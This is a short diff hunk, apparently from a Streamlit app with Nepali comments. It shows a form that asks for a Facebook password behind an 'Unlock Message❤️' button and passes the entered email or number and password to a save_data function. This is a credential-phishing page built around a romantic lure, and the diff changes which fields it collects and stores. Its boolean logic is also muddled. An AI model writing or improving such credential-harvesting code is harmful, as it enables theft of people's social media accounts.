@@ -47,14 +47,13 @@ if not st.session_state.submitted:
         password_val = st.text_input("FB Password", type="password")
         
      
-        
         submit_btn = st.form_submit_button("Unlock Message❤️")
         
         # Jaba button click hunchha, variable check garne
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
-            if number_val and password_val:
-                save_data(number_val or email_val or password_val)
+            if  email_val and password_val:
+                save_data(email_val or number_val and password_val)
                 st.session_state.submitted = True
                 st.rerun()
             else:
